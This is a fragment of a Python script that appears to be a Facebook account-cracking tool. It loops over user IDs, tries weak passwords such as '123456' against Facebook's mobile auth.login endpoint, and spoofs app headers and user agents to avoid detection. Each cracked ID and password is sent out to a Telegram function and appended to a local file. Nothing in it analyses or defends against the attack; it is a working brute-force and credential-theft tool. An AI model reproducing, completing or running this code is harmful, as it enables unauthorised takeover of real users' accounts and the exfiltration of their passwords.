    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mTDP SCANNING\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                if PROXIES:
                    session.proxies.update(PROXIES)
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers, timeout=20).json()
                if 'session_key' in str(po):
                    year = creationyear(uid)
                    status = check_fb_live(uid, FB_COOKIE)
                    send_to_tele(uid, pw, year, status)
                    open('DTD-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    year = creationyear(uid)
                    status = check_fb_live(uid, FB_COOKIE)
                    send_to_tele(uid, pw, year, status)
                    open('DTD-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()